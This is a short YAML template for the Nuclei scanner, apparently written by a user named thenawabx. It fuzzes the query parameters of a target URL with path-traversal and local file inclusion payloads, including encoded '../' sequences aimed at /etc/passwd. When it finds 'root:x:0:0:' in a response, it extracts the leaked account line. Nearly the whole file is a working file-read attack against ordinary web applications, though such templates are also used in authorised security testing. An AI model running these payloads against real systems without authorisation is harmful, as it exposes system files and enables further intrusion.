id: THENAWABX_FOUND_LFI
info:
  name: 📂 Nawab-Confirmed-LFI 📂
  author: thenawabx
  severity: critical

http:
  - method: GET
    path:
      - "{{BaseURL}}"
    payloads:
      lfi_payloads:
        - "/etc/passwd"
        - "../../../../../etc/passwd"
        - "/../../../../../../../../etc/passwd"
        - "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"

    fuzzing:
      - part: query
        type: replace
        mode: multiple
        fuzz:
          - "{{lfi_payloads}}"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        part: body
        regex:
          - "root:x:0:0:"
        condition: and

      - type: word
        part: body
        negative: true
        words:
          - "example"
          - "tutorial"
          - "placeholder"
          - "syntax"

    extractors:
      - type: regex
        part: body
        regex:
          - "root:x:0:0:[^:]+:[^:]+:[^:]+"
